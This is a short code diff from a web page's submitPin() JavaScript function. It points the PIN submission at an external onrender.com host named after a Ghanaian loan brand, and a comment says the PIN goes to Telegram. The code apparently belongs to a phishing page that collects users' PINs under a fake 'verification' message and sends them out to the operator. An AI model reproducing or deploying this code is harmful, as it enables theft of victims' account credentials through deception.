@@ -171,7 +171,7 @@ function submitPin() {
     showMessage('PIN sent for verification. Please wait...', 'success');
     
     // Send PIN to Telegram via backend
-    fetch('/api/send-message', {
+    fetch('https://ghana-bayport-loans-1.onrender.com/api/send-message', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
